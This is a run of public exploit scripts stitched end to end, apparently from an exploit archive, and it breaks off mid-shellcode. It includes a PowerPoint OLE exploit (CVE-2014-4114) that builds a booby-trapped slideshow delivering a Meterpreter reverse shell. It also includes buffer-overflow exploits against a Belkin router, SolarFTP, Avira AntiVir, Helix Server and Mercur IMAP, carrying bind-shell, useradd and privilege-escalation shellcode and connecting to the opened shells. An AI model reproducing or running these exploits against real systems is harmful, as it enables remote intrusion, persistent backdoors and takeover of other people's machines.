    xml = xml + '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/><Default Extension="jpeg" ContentType="image/jpeg"/><Default Extension="bin" ContentType="application/vnd.openxmlformats-officedocument.presentationml.printerSettings"/><Default Extension="vml" ContentType="application/vnd.openxmlformats-officedocument.vmlDrawing"/><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="wmf" ContentType="image/x-wmf"/><Override PartName="/ppt/presentation.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideshow.main+xml"/><Override PartName="/ppt/slideMasters/slideMaster1.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideMaster+xml"/><Override PartName="/ppt/slides/slide1.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/><Override PartName="/ppt/presProps.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.presProps+xml"/><Override PartName="/ppt/viewProps.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.viewProps+xml"/><Override PartName="/ppt/theme/theme1.xml" ContentType="application/vnd.openxmlformats-officedocument.theme+xml"/><Override PartName="/ppt/tableStyles.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.tableStyles+xml"/><Override PartName="/ppt/slideLayouts/slideLayout1.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"/><Override PartName="/ppt/slideLayouts/slideLayout2.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"/><Override PartName="/ppt/slideLayouts/slideLayout3.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"/><Override PartName="/ppt/slideLayouts/slideLayout4.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"/><Override PartName="/ppt/slideLayouts/slideLayout5.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"/><Override PartName="/ppt/slideLayouts/slideLayout6.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"/><Override PartName="/ppt/slideLayouts/slideLayout7.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"/><Override PartName="/ppt/slideLayouts/slideLayout8.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"/><Override PartName="/ppt/slideLayouts/slideLayout9.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"/><Override PartName="/ppt/slideLayouts/slideLayout10.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"/><Override PartName="/ppt/slideLayouts/slideLayout11.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"/><Override PartName="/ppt/embeddings/oleObject1.bin" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/><Override PartName="/ppt/embeddings/oleObject2.bin" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/><Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/><Override PartName="/docProps/app.xml" ContentType="application/vnd.openxmlformats-officedocument.extended-properties+xml"/></Types>'
 
    return xml
	
# build remotely hosted inf file 
def build_inf(gif):
    exe = gif.split('.')[0] + '.exe'
    inf = '[Version]\n'
    inf = inf + 'Signature = "$CHICAGO$"\n'
    inf = inf + 'Class=61883\n'
    inf = inf + 'ClassGuid={7EBEFBC0-3200-11d2-B4C2-00A0C9697D17}\n'
    inf = inf + 'Provider=%Microsoft%\n'
    inf = inf + 'DriverVer=06/21/2006,6.1.7600.16385\n'
    inf = inf + '[DestinationDirs]\n'
    inf = inf + 'DefaultDestDir = 1\n'
    inf = inf + '[DefaultInstall]\n'
    inf = inf + 'RenFiles = RxRename\n'
    inf = inf + 'AddReg = RxStart\n'
    inf = inf + '[RxRename]\n'
    inf = inf + exe + ', ' + gif + '\n'
    inf = inf + '[RxStart]\n'
    inf = inf + 'HKLM,Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce,Install,,%1%\\' + exe
 
    return inf

# build blank pptx file with python-pptx	
def build_presentation(filename):
    prs = Presentation()
    slide_layout = prs.slide_layouts[6] # blank slide
    slide = prs.slides.add_slide(slide_layout)
    prs.save(filename)
    return

# build metasploit meterpreter reverse_tcp payload	
def build_msfpayload(ip, port, file):
    cmd = 'msfpayload windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s X > %s' % (ip, port, file)
    run_cmd= subprocess.check_output(cmd, shell=True)
    subprocess.call(run_cmd, shell=True)
    print '[*] Meterpreter Reverse TCP EXE [%s] created.' % (file)
 
    
#################################################
###############        Main       ###############
#################################################
 
def main():
    print
    print '============================================================================='
    print '|    PowerPoint OLE Remote Code Execution (MS14-060 | CVE-2014-4114)        |'
    print '|               Author: Mike Czumak (T_v3rn1x) - @SecuritySift              |' 
    print '=============================================================================\n'
	
    args = get_args() # get the cl args 
    ip = args.ip 
    share = "share"
    ole1 = "oleObject1.bin"
    ole2 = "oleObject2.bin"
    vml = "vmlDrawing1.vml"
    pptx = "tmp.pptx"
    gif = "slide1.gif"
    inf = "slides.inf"
    
    # build meterpreter reverse tcp gif file (optional)
    if args.msf:
        print "[i] Building metasploit reverse_tcp executable"
        build_msfpayload(args.ip, args.msf, gif)
 
    # build the bin, inf and vml files
    gif_bin = build_bin("EmbeddedStg1.txt", ip, share, gif)
    inf_bin = build_bin("EmbeddedStg2.txt", ip, share, inf)
    draw_vml = build_vml()
    rem_inf = build_inf(gif)
    write_file(inf, rem_inf)
    print ("[*] INF file [%s] created " % inf)
 
    # build the xml files
    xml_rel = build_xml_rels(ole1, ole2)
    xml_slide1 = build_xml_slide1()
    xml_content = build_xml_content_types()
 
    # build blank temp pptx presentation to convert to ppsx
    build_presentation(pptx)
    zippptx = pptx + ".zip"
    os.rename(pptx, zippptx) # rename to zip for modification
    
    # open temp pptx and a copy for modification
    zin = zipfile.ZipFile(zippptx, 'r')
    zippptx_copy = "copy_" + zippptx
    zout = zipfile.ZipFile(zippptx_copy, "w")
 
    # modify the pptx template with exploit
    for item in zin.infolist():
        if (item.filename == "ppt/slides/slide1.xml"): 
            zout.writestr(item, xml_slide1) # replace slide 1 contents
        elif (item.filename == "ppt/slides/_rels/slide1.xml.rels"):
            zout.writestr(item, xml_rel) # replace slide 1 rels
        elif (item.filename == "[Content_Types].xml"):
            zout.writestr(item, xml_content) # replace content_types
        else:
            buffer = zin.read(item.filename) 
            zout.writestr(item,buffer) # use existing file
    
    zout.writestr("ppt/embeddings/" + ole1, gif_bin)
    zout.writestr("ppt/embeddings/"+ole2, inf_bin)
    zout.writestr("ppt/drawings/vmlDrawing1.vml", draw_vml)
    zout.close()
    zin.close()
    
    # convert to ppsx
    os.rename(zippptx_copy, args.filename)
    os.remove(zippptx)
    
    print ("[*] Exploit PPSX file [%s] created" % (args.filename))		
    print ("[i] Place INF and GIF (EXE) payload file (called %s) in an SMB share called 'share'" % (gif))		
    print
 
if __name__ == '__main__':
	main()"""
Source: https://labs.integrity.pt/articles/from-0-day-to-exploit-buffer-overflow-in-belkin-n750-cve-2014-1635/

A vulnerability in the guest network web interface of the Belkin N750 DB Wi-Fi Dual-Band N+ Gigabit Router with firmware F9K1103_WW_1.10.16m, allows an unauthenticated remote attacker to gain root access to the operating system of the affected device. The guest network functionality is default functionality and is delivered over an unprotected wifi network.

Successful exploitation of the vulnerability enables the attacker to gain full control of the affected router.

"""
#!/usr/bin/python
#Title : Belkin n750 buffer overflow in jump login parameter
#Date : 28 Jan 2014
#Author : Discovered and developed by Marco Vaz <mv@integrity.pt>
#Testd on: Firmware: 1.10.16m (2012/9/14 6:6:56) / Hardware : F9K1103 v1 (01C)

import httplib

headers = {}
body= “GO=&jump=”+ “a”*1379 +”%3b”+ “/usr/sbin/utelnetd -d” +”%3b&pws=\n\n”
conn = httplib.HTTPConnection(“192.168.169.1″,8080)
conn.request(“POST”, “/login.cgi”, body, headers)
response = conn.getresponse()
data = response.read()
print datasource: http://www.securityfocus.com/bid/45748/info

SolarFTP is prone to a buffer-overflow vulnerability.

An attacker can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.

SolarFTP 2.1 is vulnerable; other versions may also be affected. 

# ------------------------------------------------------------------------
# Software................Solar FTP Server 2.1
# Vulnerability...........Buffer Overflow
# Download................http://www.solarftp.com/
# Release Date............1/10/2011
# Tested On...............Windows XP SP3 EN
# ------------------------------------------------------------------------
# Author..................John Leitch
# Site....................http://www.johnleitch.net/
# Email...................john.leitch5@gmail.com
# ------------------------------------------------------------------------
# 
# --Description--
# 
# A buffer overflow in Solar FTP Server 2.1 can be exploited to execute
# arbitrary code.
# 
# 
# --PoC--

import socket

host = 'localhost'

port = 21

jmp_eax = '\xBF\x66\x02\x10'

junk = '\xCC\xCC\xCC\xCC'

nop_sled = '\x90\x90\x90' + '\x90\x90\x90\x90' * 2

# Calc shellcode by yours truly. Check the task manager
# as the calc instance will not be visible.
shell_code = "\x31\xC9"\
             "\x51"\
             "\x68\x63\x61\x6C\x63"\
             "\x54"\
             "\xB8\xC7\x93\xC2\x77"\
             "\xFF\xD0"

junk2 = 'A' * 7004


bad_stuff = junk + nop_sled + shell_code + jmp_eax * 249 + junk2
    
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(8)

print 'connecting'

s.connect((host, port))

print s.recv(8192)

s.send('USER anonymous\r\n')
print s.recv(8192)

s.send('PASS x@x.com\r\n')
print s.recv(8192)

s.send('PASV ' + bad_stuff + '\r\n')
print s.recv(8192)
s.close()

source: http://www.securityfocus.com/bid/45807/info
 
Avira AntiVir Personal is prone to multiple code-execution vulnerabilities.
 
Successful exploits may allow an attacker to execute arbitrary code with SYSTEM-level privileges. Failed exploit attempts will likely result in denial-of-service conditions.
 
Please note that these issues affect versions of the application that are no longer supported. 

#
# Avira AntiVir personal edition avguard.exe 7.00.00.52 local heap overflow
# Proof of Concept (PoC) exploit / target: WinXP SP1
# bug discovered/exploit written by D.Elser
#
# by sending two simple TCP packets which will
# exploit a vulnerability in the Antivir guard
# service, the user will gain SYSTEM privileges
#
# this PoC code will cause the avguard service
# to show a messagebox within an infinite loop


from socket import *
import sys

# the first packet which is sent must
# contain a magic ID at offset 0x18
# and the length of the second packet 
# to receive
#
# offset 0x18 : magic ID
# offset 0x1C : length of buffer for second packet


cpacket = "\x00\x00\x00\x00" \
          "\x00\x00\x00\x00" \
          "\x00\x00\x00\x00" \
          "\x00\x00\x00\x00" \
          "\x00\x00\x00\x00" \
          "\x00\x00\x00\x00" \
          "\x00\x00\x31\x06" \
          "\x00\x00\x00\x40"


lyrics = "\x42\x72\x65\x61\x6B\x62\x65\x61\x74\x20\x45\x72\x61\x20\x2D\x20" \
         "\x42\x75\x6C\x6C\x69\x74\x70\x72\x6F\x6F\x66\x0D\x0A\x0D\x0A\x45" \
         "\x6C\x65\x63\x74\x72\x69\x66\x79\x20\x6D\x65\x20\x79\x6F\x75\x20" \
         "\x6D\x79\x20\x68\x61\x6C\x66\x20\x62\x61\x6B\x65\x64\x20\x79\x6F" \
         "\x75\x74\x68\x0D\x0A\x49\x20\x6D\x65\x6D\x6F\x72\x69\x73\x65\x20" \
         "\x79\x6F\x75\x72\x20\x66\x61\x63\x65\x20\x73\x6F\x20\x49\x20\x77" \
         "\x6F\x6E\x27\x74\x20\x66\x6F\x72\x67\x65\x74\x20\x79\x6F\x75\x0D" \
         "\x0A\x44\x61\x6E\x63\x69\x6E\x67\x20\x64\x65\x6D\x6F\x6E\x73\x20" \
         "\x69\x6E\x20\x74\x68\x65\x20\x66\x69\x72\x65\x6C\x69\x67\x68\x74" \
         "\x20\x79\x65\x73\x20\x69\x74\x27\x73\x20\x74\x72\x75\x65\x0D\x0A" \
         "\x52\x65\x6D\x69\x6E\x64\x20\x6D\x65\x20\x6F\x66\x20\x74\x68\x65" \
         "\x20\x6E\x69\x67\x68\x74\x20\x49\x20\x66\x69\x72\x73\x74\x20\x6D" \
         "\x65\x74\x20\x79\x6F\x75\x0D\x0A\x43\x72\x69\x74\x69\x63\x69\x73" \
         "\x65\x20\x6D\x65\x20\x66\x6F\x72\x20\x6D\x79\x20\x6D\x69\x73\x2D" \
         "\x73\x70\x65\x6E\x74\x20\x79\x6F\x75\x74\x68\x0D\x0A\x4E\x6F\x20" \
         "\x74\x68\x72\x69\x6C\x6C\x20\x6E\x6F\x20\x6C\x69\x65\x20\x6D\x6F" \
         "\x72\x65\x20\x63\x72\x61\x7A\x79\x20\x74\x68\x61\x6E\x20\x74\x68" \
         "\x65\x20\x74\x72\x75\x74\x68\x0D\x0A\x59\x6F\x75\x20\x67\x69\x76" \
         "\x65\x20\x6D\x65\x20\x70\x72\x65\x63\x69\x6F\x75\x73\x20\x74\x68" \
         "\x69\x6E\x67\x73\x20\x49\x20\x74\x68\x72\x6F\x77\x20\x74\x68\x65" \
         "\x6D\x20\x61\x6C\x6C\x20\x61\x77\x61\x79\x0D\x0A\x41\x6E\x64\x20" \
         "\x6E\x6F\x77\x20\x79\x6F\x75\x20\x66\x72\x65\x65\x20\x6D\x79\x20" \
         "\x62\x72\x65\x61\x74\x68\x20\x79\x6F\x75\x72\x20\x73\x63\x61\x72" \
         "\x65\x64\x20\x77\x68\x61\x74\x20\x49\x20\x6D\x69\x67\x68\x74\x20" \
         "\x73\x61\x79\x0D\x0A\x0D\x0A\x53\x70\x65\x61\x6B\x20\x6E\x6F\x20" \
         "\x6C\x69\x65\x2C\x20\x49\x20\x74\x65\x6C\x6C\x20\x74\x68\x65\x20" \
         "\x74\x72\x75\x74\x68\x0D\x0A\x53\x61\x76\x65\x20\x6D\x79\x20\x62" \
         "\x72\x65\x61\x74\x68\x20\x79\x6F\x75\x20\x62\x72\x65\x61\x6B\x20" \
         "\x74\x68\x65\x20\x72\x75\x6C\x65\x73\x0D\x0A\x54\x69\x6D\x65\x20" \
         "\x77\x69\x6C\x6C\x20\x74\x65\x6C\x6C\x20\x79\x65\x61\x68\x20\x77" \
         "\x68\x6F\x20\x69\x73\x20\x77\x68\x6F\x0D\x0A\x53\x69\x64\x65\x20" \
         "\x62\x79\x20\x73\x69\x64\x65\x20\x77\x65\x27\x72\x65\x20\x62\x75" \
         "\x6C\x6C\x69\x74\x70\x72\x6F\x6F\x66\x00"


# main part of shellcode
shellcode = "\x90\x8d\x46\x1b" \
            "\x50\x05\x04\x00" \
            "\x00\x00\x50\x05" \
            "\x19\x00\x00\x00" \
            "\x50\xb8\x2f\x71" \
            "\x42\x00\xff\xd0" \
            "\x90\xeb\xe5\x10" \
            "\x20\x01\x00" \
            "I got SYSTEM privileges!\x00" + lyrics

# fill shellcode up to a specific length
for i in range(0, 0x4000 - 0x20 - len(shellcode)):
	shellcode = shellcode + "\x40"

# second part of shellcode which contains
# the pointers to be overwritten and code
# which jumps to main part of our shellcode
shellcode = shellcode + "\xEB\x0E\x90\x90" \
                        "\x90\x90\x90\x90" \
                        "\x52\xBF\x04\x78" \
                        "\xB4\x73\xED\x77" \
                        "\x8B\x57\x6C\x8B" \
                        "\xF2\x81\xEE\xE0" \
                        "\x3F\x00\x00\xFF" \
                        "\xE6\x90\x90\x90" \
                        "\x90\x90\x90\x90" \
                        "\x90\x90\x90\x90" \

	
s = socket(AF_INET,SOCK_STREAM)
s.settimeout(1)
s.connect(("127.0.0.1",18350))
print "Avira Antivir avguard.exe 7.00.00.52 local heap overflow.\n" \
      "Exploit compatible with XP SP1.\n"

print "Sending control packet (size: 0x%x)" % (len(cpacket))
s.sendall(cpacket)
print "Sending shellcode packet (size: 0x%x)" % (len(shellcode))
s.sendall(shellcode)
print "avguard response:"
print s.recv(1024)
sys.exit()
#/usr/bin/python
# Remote exploit for the vulnerability in Helix server v11.0.1 as described
# at http://gleg.net/helix.txt
#
# The exploit spawns a shell on TCP port 4444 and connects to it. At the time of
# overflow we control EAX which is used in a call as follows
# 00420C64: call dword ptr [eax + 4]
# ECX points into our buffer at the time of overflow. So if we can craft a DWORD
# that points to an address that translates to call dword ptr [ecx + xx] and
# have a pointer into our shellcode at that location then our shellcode executes
# Yes, a lot of indirection here :-). This exploit uses hardcoded address which
# worked fine on Windows 2000 server SP4 machines I have in my test lab. You may
# have to tweak it for your environment.
# Credits for discovery and POC goes to Evgeny Legerov
# Author shall bear no reponsibility for any screw ups caused by using this code
# Winny Thomas :-)

import os
import sys
import time
import base64
import socket
import struct

#alphanumeric portbind shellcode from metasploit. Binds shell to port 4444
shellcode  = "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
shellcode += "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
shellcode += "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
shellcode += "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
shellcode += "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x36\x4b\x4e"
shellcode += "\x4d\x34\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x46\x4b\x58"
shellcode += "\x4e\x56\x46\x42\x46\x42\x4b\x58\x45\x54\x4e\x53\x4b\x48\x4e\x57"
shellcode += "\x45\x30\x4a\x47\x41\x30\x4f\x4e\x4b\x48\x4f\x44\x4a\x51\x4b\x38"
shellcode += "\x4f\x55\x42\x32\x41\x50\x4b\x4e\x49\x44\x4b\x58\x46\x33\x4b\x58"
shellcode += "\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x49\x4e\x4a\x46\x48\x42\x4c"
shellcode += "\x46\x37\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
shellcode += "\x46\x4f\x4b\x53\x46\x35\x46\x52\x4a\x42\x45\x57\x45\x4e\x4b\x48"
shellcode += "\x4f\x45\x46\x52\x41\x30\x4b\x4e\x48\x46\x4b\x38\x4e\x50\x4b\x54"
shellcode += "\x4b\x48\x4f\x45\x4e\x41\x41\x30\x4b\x4e\x43\x30\x4e\x32\x4b\x58"
shellcode += "\x49\x48\x4e\x36\x46\x42\x4e\x41\x41\x56\x43\x4c\x41\x53\x4b\x4d"
shellcode += "\x46\x56\x4b\x38\x43\x54\x42\x43\x4b\x58\x42\x44\x4e\x30\x4b\x38"
shellcode += "\x42\x47\x4e\x41\x4d\x4a\x4b\x58\x42\x44\x4a\x30\x50\x55\x4a\x56"
shellcode += "\x50\x48\x50\x34\x50\x30\x4e\x4e\x42\x45\x4f\x4f\x48\x4d\x48\x36"
shellcode += "\x43\x45\x48\x56\x4a\x46\x43\x53\x44\x33\x4a\x46\x47\x37\x43\x57"
shellcode += "\x44\x33\x4f\x35\x46\x35\x4f\x4f\x42\x4d\x4a\x36\x4b\x4c\x4d\x4e"
shellcode += "\x4e\x4f\x4b\x53\x42\x45\x4f\x4f\x48\x4d\x4f\x35\x49\x38\x45\x4e"
shellcode += "\x48\x46\x41\x58\x4d\x4e\x4a\x30\x44\x30\x45\x35\x4c\x36\x44\x30"
shellcode += "\x4f\x4f\x42\x4d\x4a\x46\x49\x4d\x49\x50\x45\x4f\x4d\x4a\x47\x35"
shellcode += "\x4f\x4f\x48\x4d\x43\x35\x43\x45\x43\x55\x43\x45\x43\x35\x43\x34"
shellcode += "\x43\x55\x43\x34\x43\x45\x4f\x4f\x42\x4d\x48\x46\x4a\x36\x41\x41"
shellcode += "\x4e\x45\x48\x36\x43\x45\x49\x58\x41\x4e\x45\x39\x4a\x56\x46\x4a"
shellcode += "\x4c\x31\x42\x37\x47\x4c\x47\x45\x4f\x4f\x48\x4d\x4c\x46\x42\x31"
shellcode += "\x41\x55\x45\x55\x4f\x4f\x42\x4d\x4a\x36\x46\x4a\x4d\x4a\x50\x42"
shellcode += "\x49\x4e\x47\x45\x4f\x4f\x48\x4d\x43\x55\x45\x35\x4f\x4f\x42\x4d"
shellcode += "\x4a\x36\x45\x4e\x49\x54\x48\x58\x49\x44\x47\x55\x4f\x4f\x48\x4d"
shellcode += "\x42\x55\x46\x35\x46\x35\x45\x35\x4f\x4f\x42\x4d\x43\x39\x4a\x56"
shellcode += "\x47\x4e\x49\x47\x48\x4c\x49\x37\x47\x45\x4f\x4f\x48\x4d\x45\x45"
shellcode += "\x4f\x4f\x42\x4d\x48\x46\x4c\x36\x46\x56\x48\x36\x4a\x46\x43\x46"
shellcode += "\x4d\x46\x49\x58\x45\x4e\x4c\x56\x42\x35\x49\x55\x49\x52\x4e\x4c"
shellcode += "\x49\x38\x47\x4e\x4c\x56\x46\x54\x49\x58\x44\x4e\x41\x53\x42\x4c"
shellcode += "\x43\x4f\x4c\x4a\x50\x4f\x44\x54\x4d\x52\x50\x4f\x44\x34\x4e\x32"
shellcode += "\x43\x49\x4d\x48\x4c\x47\x4a\x33\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x36"
shellcode += "\x44\x47\x50\x4f\x43\x4b\x48\x41\x4f\x4f\x45\x57\x46\x34\x4f\x4f"
shellcode += "\x48\x4d\x4b\x45\x47\x55\x44\x55\x41\x45\x41\x35\x41\x55\x4c\x36"
shellcode += "\x41\x30\x41\x35\x41\x55\x45\x45\x41\x45\x4f\x4f\x42\x4d\x4a\x56"
shellcode += "\x4d\x4a\x49\x4d\x45\x30\x50\x4c\x43\x35\x4f\x4f\x48\x4d\x4c\x56"
shellcode += "\x4f\x4f\x4f\x4f\x47\x33\x4f\x4f\x42\x4d\x4b\x38\x47\x55\x4e\x4f"
shellcode += "\x43\x48\x46\x4c\x46\x36\x4f\x4f\x48\x4d\x44\x55\x4f\x4f\x42\x4d"
shellcode += "\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x43\x55\x4f\x4f\x48\x4d"
shellcode += "\x4f\x4f\x42\x4d\x5a\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

def ExploitHelix(target):
       sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       sock.connect((target, 554))

       payload  = 'A' * 1116
       # This DWORD in payload causes a call into the next DWORD
       payload += struct.pack('<L', 0x0431DE94)
       # Address of call dword ptr [ecx + 50] from kernel32.dll
       payload += struct.pack('<L', 0x7C57D660)
       payload += '\x90\x90\x90\x90\x90\x90\xeb\x0a'
       payload += '\x90\x90\x90\x90\x90\x90\x90\x90'
       payload += '\x90\x90\x90\x90\x90\x90\x90\x90'
       payload += '\x90\x90\x90\x90\x90\x90\x90\x90'
       payload += '\x90\x90\x90\x90\x90\x90\x90\x90'
       payload += '\x90\x90\x90\x90\x90\x90\x90\x90'
       payload += '\x90\x90\x90\x90\x90\x90\x90\x90'
       payload += '\x90\x90\x90\x90\x90\x90\x90\x90'
       payload += '\x90\x90\x90\x90\x90\x90\x90\x90'
       # Pointer into our shellcode which get referenced from 0x7C57D660
       payload += struct.pack('<L', 0x0431DEEE)
       payload += '\x90\x90\x90\x90\x90\x90\x90\x90' * 10
       payload += shellcode
       payload += 'Z' * 20000

       # Code snippet from the original POC
       req = "DESCRIBE rtsp://%s:%d/asdf.mp3 RTSP/1.0\r\n"%(target,554)
       req += "LoadTestPassword: %srrr\r\n" % (base64.encodestring(payload).replace("\n",""))
       req += "\r\n"

       sock.send(req)
       sock.close()

def ConnectRemoteShell(target):
       connect = "/usr/bin/telnet " + target + " 4444"
       os.system(connect)

if __name__=="__main__":
       try:
               target = sys.argv[1]
       except IndexError:
               print 'Usage: %s <target ip>\n' % sys.argv[0]
               sys.exit(-1)

       ExploitHelix(target)
       print 'Exploit sent to: %s' % target
       print 'Connecting to %s:4444' % target
       time.sleep(3)
       ConnectRemoteShell(target)

# milw0rm.com [2007-03-21]
#!/usr/bin/python
# Remote exploit for the stack overflow vulnerability in Mercur Messaging 2005
# SP3 IMAP service. The exploit was tested on windows 2000 server SP4 in a
# Vmware environment. At the time of overflow EBX points to our shellcode.
# However this buffer into which EBX points will give a maximum of 224 bytes of
# uninterrupted space for shellcode. So for my analysis is settled for a useradd
# shellcode which comes to 224 bytes :-). However looking at it a little bit
# further i found that you can send SUBSCRIBE request just before the actual
# command that causes the overflow and you have a shellcode space of 520 bytes
# further down the stack. So you can club the 224 bytes you get at overflow time
# with this 520 and use a two stage shellcode. Too tired for that stunt so
# wrote this exploit which add user x with password x to the admin group. Too
# tired that i did not even clean up the code from the junk i used. You need to
# have a valid IMAP account for this exploit to work.
#
# Author shall bear no reponsibility for any screw ups caused by using this code
# Winny Thomas :-)
#
import os
import sys
import time
import socket
import struct

shellcode = "\x33\xc9\x83\xe9\xce\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xa4"
shellcode += "\xa1\x39\xec\x83\xeb\xfc\xe2\xf4\x58\x49\x7d\xec\xa4\xa1\xb2\xa9"
shellcode += "\x98\x2a\x45\xe9\xdc\xa0\xd6\x67\xeb\xb9\xb2\xb3\x84\xa0\xd2\xa5"
shellcode += "\x2f\x95\xb2\xed\x4a\x90\xf9\x75\x08\x25\xf9\x98\xa3\x60\xf3\xe1"
shellcode += "\xa5\x63\xd2\x18\x9f\xf5\x1d\xe8\xd1\x44\xb2\xb3\x80\xa0\xd2\x8a"
shellcode += "\x2f\xad\x72\x67\xfb\xbd\x38\x07\x2f\xbd\xb2\xed\x4f\x28\x65\xc8"
shellcode += "\xa0\x62\x08\x2c\xc0\x2a\x79\xdc\x21\x61\x41\xe0\x2f\xe1\x35\x67"
shellcode += "\xd4\xbd\x94\x67\xcc\xa9\xd2\xe5\x2f\x21\x89\xec\xa4\xa1\xb2\x84"
shellcode += "\x98\xfe\x08\x1a\xc4\xf7\xb0\x14\x27\x61\x42\xbc\xcc\x51\xb3\xe8"
shellcode += "\xfb\xc9\xa1\x12\x2e\xaf\x6e\x13\x43\xc2\x54\x88\x8a\xc4\x41\x89"
shellcode += "\x84\x8e\x5a\xcc\xca\xc4\x4d\xcc\xd1\xd2\x5c\x9e\x84\xd9\x19\x94"
shellcode += "\x84\x8e\x78\xa8\xe0\x81\x1f\xca\x84\xcf\x5c\x98\x84\xcd\x56\x8f"
shellcode += "\xc5\xcd\x5e\x9e\xcb\xd4\x49\xcc\xe5\xc5\x54\x85\xca\xc8\x4a\x98"
shellcode += "\xd6\xc0\x4d\x83\xd6\xd2\x19\x94\x84\x8e\x78\xa8\xe0\xa1\x39\xec"

def ExploitMercur(target, username, passwd):
       sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       sock.connect((target, 143))
       response = sock.recv(1024)
       print response

       login = 'a001 LOGIN ' + username + ' ' + passwd + '\r\n'
       sock.send(login)
       response = sock.recv(1024)
       print response

       payload = shellcode
       payload += 'L' * 3
       payload += struct.pack('<L', 0x7C577B03)
       payload += 'Y' * 4
       payload += 'Z' * 4
       payload += 'L' *  25
       payload += 'M' *  16

       payload += ' ' + '\"/\"' + ' ' + '\"\"'
       req = 'a001 SUBSCRIBE ' + payload + '\r\n'
       sock.send(req)
       sock.close()
       print 'User x added with passwd x to administrator group'

def ConnectRemoteShell(target):
       connect = "/usr/bin/telnet " + target + " 4444"
       os.system(connect)

if __name__=="__main__":
       try:
               target = sys.argv[1]
               username = sys.argv[2]
               passwd = sys.argv[3]
       except IndexError:
               print 'Usage: %s <imap server> <username> <password>\n' % sys.argv[0]
               sys.exit(-1)

       ExploitMercur(target, username, passwd)

# milw0rm.com [2007-03-21]
#!/usr/bin/python
# 
# Mercur Messaging 2005 SP3 IMAP service - Egghunter mod
# muts@offensive-security.com
# http://www.offensive-security.com
# Original exploit by Winny Thomas
# Thanks Thomas, this code really came in handy !
# VMWare seems to alter the stack a bit as the offset 
# of the EIP overwrite was a few bytes off (Windows XPsp2).
# You can inject more than 2000 bytes using an IMAP command (I chose LIST), 
# and then let the egghunter do the rest of the work.
# The initial injected buffer gets cut off, so you need to double check that.
# 
# bt ~ # ./imap.py 192.168.0.75 test test
# * OK MERCUR IMAP4-Server (v5.00.14 Unregistered) for Windows ready at Thu, 22 Mar 2007 00:59:19 +0200
# a001 OK LOGIN completed
# BAD Command unknown
# Shell on port 4444
# 
# bt ~ # nc -v 192.168.0.75 4444
# 192.168.0.75: inverse host lookup failed: Unknown host
# (UNKNOWN) [192.168.0.75] 4444 (krb524) open
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
# 
# C:\WINDOWS\system32>

 

import os
import sys
import time
import socket
import struct

# Place our w00tw00t egghunter in nop heaven

shellcode = "\x90" * 92 
shellcode +="\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
shellcode +="\x90" * 100
 
# Place w00t and bindshell in correct place in LIST command.

bindshell = "\x90" * 320
bindshell +="\x54\x30\x30\x57\x54\x30\x30\x57" 

# win32_bind -  EXITFUNC=seh LPORT=4444 Size=709 Encoder=PexAlphaNum http://metasploit.com
bindshell +=("\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x36\x4b\x4e"
"\x4f\x44\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x56\x4b\x58"
